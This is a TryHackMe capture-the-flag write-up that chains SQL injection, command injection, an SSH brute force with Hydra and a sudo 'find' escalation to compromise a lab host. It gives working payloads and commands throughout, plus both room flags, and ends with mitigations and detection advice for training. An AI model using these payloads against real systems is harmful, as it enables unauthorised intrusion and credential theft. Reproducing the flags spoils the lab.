# TryHackMe - Operation Promotion Writeup

## Machine Information

| Category | Details |
|----------|----------|
| Platform | TryHackMe |
| Room | Operation Promotion |
| Difficulty | Easy |
| Operating System | Linux |

---

# Introduction

Today we are solving another **TryHackMe** challenge named **Operation Promotion**.

This room simulates a realistic penetration testing engagement against a small recruiting company called **RecruitCorp**. Unlike traditional Linux boxes that rely on a single vulnerability, this machine requires chaining together multiple weaknesses beginning with web application flaws before transitioning into system enumeration and privilege escalation.

Throughout this assessment we will enumerate exposed services, bypass authentication using SQL Injection, exploit a vulnerable maintenance application to gain Remote Code Execution, recover credentials from the compromised server, obtain SSH access, and eventually escalate privileges to root.

The room demonstrates how multiple seemingly minor security issues can combine into a complete system compromise.

---

# Scenario

The scenario provided for this challenge is:

> You are up for promotion at **Hadron Security**. Your senior lead, Mara, has handed you a solo engagement against **RecruitCorp**, a small recruiting firm with a public-facing portal. Compromise the host, capture both flags, and demonstrate that you are ready for the Penetration Tester title.

Target Machine:

```
10.48.136.91
```

---

# Objectives

The objectives of this engagement are:

- Perform service enumeration.
- Enumerate SMB.
- Assess the web application.
- Discover hidden functionality.
- Bypass authentication.
- Achieve Remote Code Execution.
- Enumerate the compromised server.
- Recover application credentials.
- Gain SSH access.
- Escalate privileges.
- Capture both flags.

---

# Attack Path Overview

```
Reconnaissance
      │
      ▼
Service Enumeration
      │
      ▼
SMB Enumeration
      │
      ▼
Web Enumeration
      │
      ▼
SQL Injection
      │
      ▼
Admin Access
      │
      ▼
Command Injection
      │
      ▼
Reverse Shell
      │
      ▼
Configuration Enumeration
      │
      ▼
Credential Recovery
      │
      ▼
SSH Access
      │
      ▼
Privilege Escalation
```

---

# Initial Enumeration

As with every penetration test, we begin by identifying the services exposed by the target system.

A full TCP port scan is performed.

```bash
nmap -p- 10.48.136.91
```

The scan discovers four open ports.

```
22/tcp   SSH
80/tcp   HTTP
139/tcp  NetBIOS
445/tcp  SMB
```

The presence of SMB alongside a web application suggests that both services should be investigated, as they may reveal usernames, shares, or additional attack vectors.

---

# Service and Version Detection

To gather more information about each service, a version detection scan is executed.

```bash
nmap -sC -sV 10.48.136.91
```

The results reveal the following services.

| Port | Service | Version |
|------|----------|----------|
|22|SSH|OpenSSH 9.6p1 Ubuntu|
|80|HTTP|Apache 2.4.58 Ubuntu|
|139|SMB|Samba 4|
|445|SMB|Samba 4|

Additional information obtained during enumeration includes:

- Apache web server running on Ubuntu.
- Samba version 4.
- NetBIOS hostname **RECRUITCORP**.
- SMB signing enabled but not enforced.
- A disallowed directory inside **robots.txt**.

One of the most interesting discoveries is the robots file.

```
/robots.txt
```

which contains

```
Disallow: /admin/
```

Administrative portals frequently contain functionality unavailable to regular users, making this an ideal starting point for further enumeration.

---

# SMB Enumeration

Since SMB is exposed, the next step is to enumerate the service.

The tool **enum4linux** is used.

```bash
enum4linux 10.48.136.91
```

While no anonymous shares or immediately exploitable misconfigurations are identified, SID enumeration successfully discloses local usernames.

```
ubuntu

jford
```

Although these accounts cannot yet be accessed, valid usernames become extremely useful later when password attacks are performed.

At this stage no additional SMB weaknesses are identified, so attention shifts to the web application.

---

# Web Enumeration

Browsing to the web server presents the **RecruitCorp Careers Portal**.

The application appears simple from the outside, however the previously discovered **robots.txt** entry indicates an administrative section exists.

Navigating to

```
http://10.48.136.91/admin/
```

reveals an administrator login page.

Instead of attempting password guessing, the authentication mechanism is tested for common web vulnerabilities.

---

# SQL Injection Authentication Bypass

A classic authentication bypass payload is supplied.

```sql
admin' OR 'x'='x' --+
```

The application immediately authenticates the session and grants administrator access.

This confirms that user input is being directly incorporated into an SQL query without proper sanitization or parameterized statements.

Authentication bypass through SQL Injection remains one of the most dangerous web application vulnerabilities because it allows attackers to completely circumvent login controls without requiring valid credentials.

---

# Administrator Portal Enumeration

Once authenticated, several administrator-only pages become accessible.

One endpoint immediately stands out.

```
/admin/users/lookup.php?id=
```

The page accepts a numeric identifier.

Testing multiple IDs reveals user information stored within the application.

Eventually, requesting ID **7** returns an interesting account.

```
Username : sysmaint

Role : system

Notes :

Service account for

/admin/sysmaint-checks/ping.php

Do not disable.
```

The administrator's notes disclose another hidden application that appears to perform maintenance operations.

This immediately becomes the next target for investigation.

---

# Discovering Command Injection

Visiting the maintenance endpoint displays the following usage message.

```
Usage:

/admin/sysmaint-checks/ping.php?host=<target>
```

Applications that execute operating system utilities using user-supplied parameters are commonly vulnerable to command injection.

To verify this, the following payload is supplied.

```bash
google.com;id
```

Instead of only executing the ping command, the application also executes the injected **id** command.

The response confirms successful operating system command execution.

```
uid=33(www-data)

gid=33(www-data)

groups=33(www-data)
```

At this point we have achieved Remote Command Execution through the web application.

---

# Obtaining a Reverse Shell

Since arbitrary commands can be executed, the next objective is obtaining an interactive shell.

A Netcat listener is prepared on the attacking machine.

```bash
nc -lvnp 4444
```

A Bash reverse shell payload is then supplied through the vulnerable **host** parameter.

After executing the payload, the listener receives an incoming connection.

```
connect to

10.48.136.91
```

The shell is obtained as the web server account.

```
www-data
```

With interactive command execution established, the attack transitions from web exploitation to local system enumeration.

---

# Stabilizing the Shell

Reverse shells often lack terminal functionality, making command execution inconvenient.

The shell is upgraded using Python.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After backgrounding the session, terminal settings are corrected.

```bash
stty raw -echo

fg

export TERM=xterm-256color
```

The shell now supports interactive programs, terminal editing, and proper command history, significantly improving the post-exploitation experience.

---

# Local Enumeration

With stable shell access established, local application files are examined.

Reviewing the application source reveals that user information is stored inside an SQLite database.

```php
$db = new SQLite3('/var/lib/recruitcorp/app.db');
```

Knowing the backend database location provides valuable insight into how the application stores authentication data and user records.

---

# Discovering Application Credentials

Continuing the enumeration reveals an interesting configuration file.

```
/var/www/html/config/db.conf
```

The contents include application configuration details.

```
db_host=localhost

db_name=recruitcorp

db_user=jford

db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq

db_engine=sqlite3
```

Although the plaintext password is not available, the configuration reveals an important username along with a bcrypt password hash.

Further analysis also suggests the organization follows a predictable password policy using the current season, year, and a special character.

For example:

```
spring2026!
```

Rather than relying on random brute force attempts, a targeted wordlist is generated using Hashcat rule-based mutations.

```bash
hashcat --stdout base.txt \
-r /usr/share/hashcat/rules/dive.rule \
> wordlist.txt
```

This produces thousands of password candidates that closely follow the organization's naming convention.

---

# SSH Credential Attack

With a valid username and a custom password list prepared, Hydra is used against the SSH service.

```bash
hydra -l jford -P wordlist.txt ssh://10.48.136.91
```

After testing the generated candidates, Hydra successfully discovers valid credentials.

```
Username: jford

Password: spring2026!
```

The credentials provide direct SSH access to the system.

Connecting through SSH presents a stable user shell.

```bash
ssh jford@10.48.136.91
```

The first flag can now be retrieved.

```bash
cat user.txt
```

Output:

```
THM{bdbee0a91ebcb0b0fafde931223efe09}
```

At this point the initial compromise is complete. In the next stage we will focus on local privilege escalation by enumerating sudo permissions, identifying dangerous command execution rights, abusing GTFOBins techniques, and obtaining full root access.

# Privilege Escalation

After successfully obtaining SSH access as **jford**, the next objective is to identify possible privilege escalation vectors.

The first step during post-exploitation is always to enumerate the user's permissions.

The most common command for this is:

```bash
sudo -l
```

The output reveals the following.

```
Matching Defaults entries for jford on recruitcorp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
```

This output is immediately interesting because the user is allowed to execute **find** as **root** without providing a password.

```
NOPASSWD: /usr/bin/find
```

Whenever a binary is allowed to run with elevated privileges, it should always be checked against **GTFOBins** to determine whether it can be abused for privilege escalation.

---

# Enumerating the Sudo Binary

GTFOBins is a curated collection of Unix binaries that can be abused to bypass security restrictions under certain configurations.

Searching for **find** on GTFOBins reveals that it supports arbitrary command execution through the **-exec** option.

Since the binary is allowed to run as root, any command executed by **find** will inherit root privileges.

The documented payload is:

```bash
sudo /usr/bin/find . -exec /bin/bash \; -quit
```

Breaking this command down:

- `sudo` executes the command with root privileges.
- `find .` begins searching the current directory.
- `-exec` runs another command for every match.
- `/bin/bash` launches a new shell.
- `-quit` exits immediately after executing the first command.

Because the shell is launched by a root-owned process, the resulting shell also runs with root privileges.

---

# Obtaining Root Access

Executing the GTFOBins payload immediately spawns a root shell.

```bash
sudo /usr/bin/find . -exec /bin/bash \; -quit
```

Verifying the current user confirms successful privilege escalation.

```bash
whoami
```

Output

```
root
```

At this point the system has been fully compromised.

---

# Capturing the Root Flag

After obtaining root access, the root directory is inspected.

```bash
cd /root
```

Listing its contents reveals the final flag.

```bash
ls
```

```
flag.txt
snap
```

Reading the file completes the room.

```bash
cat flag.txt
```

Output

```
THM{d999a1f6319a9c5b48c067dfab314ba2}
```

Both user and root objectives have now been successfully completed.

---

# Attack Chain

The complete compromise followed the path below.

```
Reconnaissance
        │
        ▼
Port Enumeration
        │
        ▼
SMB Enumeration
        │
        ▼
robots.txt Discovery
        │
        ▼
Admin Login Page
        │
        ▼
SQL Injection Authentication Bypass
        │
        ▼
Admin Portal Access
        │
        ▼
User Enumeration
        │
        ▼
Discovery of ping.php
        │
        ▼
Command Injection
        │
        ▼
Reverse Shell
        │
        ▼
Application Enumeration
        │
        ▼
Database Configuration Discovery
        │
        ▼
Password Policy Analysis
        │
        ▼
Custom Wordlist Generation
        │
        ▼
Hydra SSH Attack
        │
        ▼
SSH Access as jford
        │
        ▼
sudo -l Enumeration
        │
        ▼
GTFOBins
        │
        ▼
Root Shell
```

---

# Vulnerability Analysis

## SQL Injection

The administrator login page failed to sanitize user input before constructing SQL queries.

This allowed authentication to be bypassed without possessing valid credentials.

Impact:

- Authentication bypass
- Unauthorized administrator access
- Information disclosure
- Access to hidden functionality

Mitigation:

- Prepared statements
- Parameterized queries
- Input validation
- Least privilege database accounts

---

## Command Injection

The maintenance utility accepted user-controlled input and directly executed system commands.

By appending shell metacharacters, arbitrary operating system commands could be executed.

Impact:

- Remote Code Execution
- Server compromise
- Reverse shell
- Full application takeover

Mitigation:

- Avoid shell execution
- Validate input
- Allowlist acceptable hostnames
- Execute commands through safe APIs

---

## Credential Disclosure

Sensitive configuration files were readable by the compromised web server account.

These files exposed valuable information including usernames and password hashes.

Although the passwords were hashed, they provided intelligence useful for subsequent attacks.

Mitigation:

- Restrict file permissions
- Store secrets outside the web root
- Use secret management solutions
- Limit service account access

---

## Weak Password Policy

Password construction followed a predictable format.

```
Season

+

Year

+

Special Character
```

Because the pattern was easily inferred, generating an effective wordlist became straightforward.

Predictable password policies dramatically reduce password entropy and make targeted attacks significantly more effective.

Mitigation:

- Random passwords
- Password managers
- Multi-Factor Authentication
- Password rotation

---

## Unsafe sudo Configuration

Allowing users to execute powerful binaries through sudo can easily result in privilege escalation.

Although **find** appears harmless, its ability to execute arbitrary commands makes it extremely dangerous when granted elevated privileges.

Mitigation:

- Review sudo permissions regularly.
- Restrict commands to purpose-built administrative scripts.
- Avoid allowing interactive binaries through sudo.
- Apply the principle of least privilege.

---

# MITRE ATT&CK Mapping

| Stage | Technique | ATT&CK ID |
|---------|-----------|------------|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Brute Force | T1110 |
| Execution | Command and Scripting Interpreter | T1059 |
| Discovery | File and Directory Discovery | T1083 |
| Discovery | System Information Discovery | T1082 |
| Credential Access | Unsecured Credentials | T1552 |
| Persistence | Valid Accounts | T1078 |
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |

---

# Detection Opportunities

Security teams could detect this attack chain at several stages.

Possible detections include:

- Multiple failed login attempts against the administrator portal.
- SQL Injection payloads within HTTP POST requests.
- Requests containing shell metacharacters such as `;`, `&&`, or `|`.
- Unexpected execution of `ping` followed by commands like `id`, `whoami`, or `bash`.
- Outbound reverse shell connections initiated by the web server.
- Web server processes reading sensitive configuration files.
- Large numbers of SSH authentication attempts from a single host.
- Execution of `find` using sudo privileges.
- Root shells spawned from uncommon parent processes.

Combining web server logs, process monitoring, authentication logs, and EDR telemetry would significantly improve detection capability.

---

# Security Recommendations

Based on the findings from this engagement, RecruitCorp should implement the following improvements.

- Use parameterized SQL queries to eliminate SQL Injection.
- Validate all user input before processing.
- Remove command execution functionality from web applications whenever possible.
- Store sensitive configuration files outside the web root.
- Enforce strong, randomly generated passwords.
- Enable Multi-Factor Authentication for administrative accounts.
- Monitor privileged command execution.
- Review sudo permissions regularly.
- Apply least privilege across user and service accounts.
- Conduct periodic penetration testing to identify similar attack paths.

---

# Lessons Learned

Operation Promotion demonstrates how attackers frequently combine multiple low and medium severity vulnerabilities into a complete compromise.

No single issue on this machine was enough to immediately obtain root access. Instead, successful exploitation required chaining together web application vulnerabilities, insecure credential management, predictable password policies, and an unsafe sudo configuration.

This mirrors real-world penetration testing engagements, where attackers rarely rely on a single critical vulnerability. Careful enumeration, understanding application logic, and systematically exploiting each weakness ultimately led to full system compromise.

---

# Conclusion - Jai Shri Ram

**Operation Promotion** is an excellent beginner-friendly room that closely resembles a real-world web application assessment. It combines reconnaissance, SMB enumeration, SQL Injection, command injection, post-exploitation, credential attacks, and Linux privilege escalation into a single attack chain.

The room reinforces the importance of thorough enumeration and demonstrates how seemingly isolated weaknesses can combine to create a high-impact security incident. For defenders, it highlights the need for secure coding practices, strong authentication policies, proper secret management, and careful privilege assignment to reduce the overall attack surface.
